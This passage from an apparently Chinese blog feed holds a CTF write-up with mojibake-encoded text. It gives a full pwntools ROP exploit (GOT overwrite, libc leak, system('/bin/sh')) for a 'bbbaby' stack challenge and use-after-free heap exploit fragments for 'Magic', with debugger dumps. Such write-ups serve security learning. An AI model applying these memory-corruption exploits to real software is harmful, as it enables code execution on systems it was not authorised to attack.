hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">è¿™é‡Œæœ‰ä¸œè¥¿è¢«åŠ å¯†äº†ï¼Œéœ€è¦è¾“å…¥å¯†ç æŸ¥çœ‹å“¦ã€‚</summary>
    
    
    
    
    <category term="OS" scheme="http://example.com/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>é™‡åŸæˆ˜ç–«æ¯2021éƒ¨åˆ†WP</title>
    <link href="http://example.com/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/"/>
    <id>http://example.com/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/</id>
    <published>2021-11-14T16:00:00.000Z</published>
    <updated>2021-11-16T06:41:50.004Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>éƒ½æ˜¯èµ›åå†™çš„ï¼Œwtclã€‚</p><p>è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šã€‚</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="bbbaby"><a href="#bbbaby" class="headerlink" title="bbbaby"></a>bbbaby</h2><p>æ€è·¯ï¼š</p><ul><li>  æœ‰canaryï¼Œä½¿ç”¨sub_40086Cè¦†ç›–canaryä¸ºputsç»•è¿‡</li><li>  ä¹‹åå°±æ˜¯æ³„éœ²libcï¼Œå†™ropé“¾å°±å¥½</li></ul><p>å…ˆçœ‹ä¸‹ä¿æŠ¤ï¼Œåªå¼€äº†canaryï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    gwt@ubuntu:~/Desktop$ checksec pwn1 </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/pwn1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400766();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;your choice&quot;</span>);</span><br><span class="line">      v4 = input_fun();</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_40086C(<span class="string">&quot;your choice&quot;</span>, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_4008BB(v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_40086Cï¼Œç›´æ¥å¾€v0çš„åœ°æ–¹(åœ°å€ï¼Ÿ)å†™å…¥8å­—èŠ‚å†…å®¹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_40086C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;address:&quot;</span>);</span><br><span class="line">  v0 = input_fun();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v0, <span class="number">8uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_4008BB:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">sub_4008BB</span><span class="params">(<span class="keyword">void</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">  nbytes = input_fun();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, str, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Low Address |                 |</span><br><span class="line">            +-----------------+</span><br><span class="line">    esp =&gt;  | <span class="built_in">local</span> variables |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |    buf[0-3]     |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |    buf[4-7]     |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |     canary      |</span><br><span class="line">            +-----------------+</span><br><span class="line">    ebp =&gt;  |     old ebp     |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |   <span class="built_in">return</span> addr   |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |      args       |</span><br><span class="line">            +-----------------+</span><br><span class="line">   High Address |                 |</span><br></pre></td></tr></table></figure><p>è¦†å†™canaryä¸ºputs</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x40089f    cdqe   </span><br><span class="line">   0x4008a1    mov    edx, 8</span><br><span class="line">   0x4008a6    mov    rsi, rax</span><br><span class="line">   0x4008a9    mov    edi, 0</span><br><span class="line">   0x4008ae    mov    eax, 0</span><br><span class="line"> â–º 0x4008b3    call   <span class="built_in">read</span>@plt &lt;0x400610&gt;</span><br><span class="line">        fd: 0x0</span><br><span class="line">        buf: 0x601020 â€”â–¸ 0x400606 (__stack_chk_fail@plt+6) â—‚â€” push   1</span><br><span class="line">        nbytes: 0x8</span><br><span class="line"> </span><br><span class="line">   0x4008b8    nop    </span><br><span class="line">   0x4008b9    leave  </span><br><span class="line">   0x4008ba    ret    </span><br><span class="line"> </span><br><span class="line">   0x4008bb    push   rbp</span><br><span class="line">   0x4008bc    mov    rbp, rsp</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp  0x7ffdb00bc120 â—‚â€” 0x0</span><br><span class="line">01:0008â”‚      0x7ffdb00bc128 â—‚â€” 0x601020226ef100</span><br><span class="line">02:0010â”‚ rbp  0x7ffdb00bc130 â€”â–¸ 0x7ffdb00bc260 â€”â–¸ 0x4009a0 â—‚â€” push   r15</span><br><span class="line">03:0018â”‚      0x7ffdb00bc138 â€”â–¸ 0x400966 â—‚â€” jmp    0x400939</span><br><span class="line">04:0020â”‚      0x7ffdb00bc140 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f 0           4008b3</span><br><span class="line">   f 1           400966</span><br><span class="line">   f 2     7f4c384af840 __libc_start_main+240</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    pwndbg&gt; x/20gx 0x601020</span><br><span class="line">0x601020:0x00000000004005ec0x00007f4c38586350</span><br><span class="line">0x601030:0x00007f4c384af7500x00007f4c384fee80</span><br><span class="line">0x601040:0x00007f4c384c5e900x0000000000400656</span><br><span class="line">0x601050:0x00000000000000000x0000000000000000</span><br><span class="line">0x601060:0x000000deadffffcd0x0000000000000000</span><br><span class="line">0x601070:0x00000000000000000x0000000000000000</span><br><span class="line">0x601080 &lt;stdout&gt;:0x00007f4c388546200x0000000000000000</span><br><span class="line">0x601090 &lt;stdin&gt;:0x00007f4c388538e00x0000000000000000</span><br><span class="line">0x6010a0 &lt;stderr&gt;:0x00007f4c388545400x0000000000000000</span><br><span class="line">0x6010b0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">    p=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27412)</span></span><br><span class="line">    elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">    context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret=<span class="number">0x0000000000400a03</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;address:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x601020</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;address:\n&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x200</span>))</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x110</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x40090b</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice\n&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    puts=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    success(<span class="string">&#x27;puts:&#x27;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line">    libc_base=puts-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;address:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x601020</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;address:\n&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x200</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x110</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x4005d9</span>)+p64(pop_rdi_ret)+p64(sh)+p64(system))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice\n&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>64ï¼Œæ— å£³</p><p>çœ‹ç€æ¯”è¾ƒéº»çƒ¦ï¼Œè¿˜æ˜¯èœå•çš„heapé¢˜ã€‚</p><p>å…¶ä¸­çš„dword_202090ä¸º2ï¼Œä½†æ˜¯ä»–å¹¶æ²¡æœ‰å¯¹indexè¿›è¡Œå…¶ä»–çš„æ“ä½œï¼Œé‚£ä¹ˆä¸€ç›´malloc(0)ä¹Ÿæ˜¯OKçš„ï¼Œæ¯æ¬¡mallocçš„å¤§å°æ˜¯å›ºå®šçš„</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211114224708423.png" alt="image-20211114224708423"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211112092826786.png" alt="image-20211112092826786"></p><p>æœ‰ä¸¤ä¸ªUAFï¼Œä¸€ä¸ªæ˜¯editï¼Œä¸€ä¸ªæ˜¯delete</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211112093027987.png" alt="image-20211112093027987"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211112093008658.png" alt="image-20211112093008658"></p><ul><li>  addï¼šindexå¿…é¡»å°äº2ï¼Œä¸”æ¯æ¬¡mallocä¸º0x60</li><li>  edit+printï¼šå­˜åœ¨uafï¼Œå¹¶æ²¡æœ‰å¯¹indexåšæ£€æŸ¥</li><li>  deleteï¼šåªfreeäº†ï¼Œå¹¶æ²¡æœ‰ç½®é›¶ï¼Œå­˜åœ¨uafã€‚</li></ul><p>ä»–åœ¨editçš„è¾“å‡ºçš„æ—¶å€™ï¼Œä¼šæŠŠå…¶ä»–çš„ä¸œè¥¿ä¸€å¹¶å¸¦å‡ºæ¥ï¼Œ</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115001921220.png" alt="image-20211115001921220"></p><p>æœ‰è¿™ä¹ˆå‡ ç§è§£æ³•å§ï¼Œä¸€ä¸ªæ˜¯ç›´æ¥uafå†™__malloc_hookï¼Œonegadgetï¼š(ä¸çŸ¥é“ä¸ºå•¥æ˜¯é€šä¸äº†ï¼Œæœ‰æ—¶å¯ä»¥)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x7f1df4510d61</span>+<span class="number">0x7f1df414c000</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+<span class="number">0xf1247</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§ï¼Œå› ä¸ºå‰é¢å·²ç»å°†flagè¯»è¿›æ¥äº†ï¼Œç›´æ¥æ³„éœ²ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># alloc</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare for a fake 0x70 chunk</span></span><br><span class="line">edit(<span class="number">1</span>, flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x71</span>]))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># partial overwrite </span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;\xe0&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak flag</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">base_addr = u64((<span class="string">&#x27;\x00&#x27;</span> + edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>)[<span class="number">1</span>:]).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7ffff7dd1d00</span> + <span class="number">0x7ffff7dd25dd</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">flag_addr = u64((<span class="string">&#x27;\x00&#x27;</span> + edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>)[<span class="number">1</span>:]).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) + <span class="number">0x55c0b7554240</span> - <span class="number">0x55c0b7554000</span></span><br><span class="line"><span class="comment"># print &quot;&gt;&gt;&gt;&gt;&gt;&quot;+hex(flag_addr)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(base_addr))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Input your choice:&#x27;</span>) </span><br><span class="line">sd(<span class="string">&#x27;2&#x27;</span>+<span class="string">&#x27;\x00\x00\x00&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Input the idx&#x27;</span>) </span><br><span class="line">sd(<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&#x27;\x00\x00\x00&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Input the Magic&#x27;</span>) </span><br><span class="line">sd(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x7ffff7dd2620</span> - <span class="number">0x7ffff7dd25dd</span> - <span class="number">0x10</span>) + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(flag_addr))</span><br><span class="line">ru(<span class="string">&#x27;flag&#123;&#x27;</span>) </span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span>+ru(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="EasyRe"><a href="#EasyRe" class="headerlink" 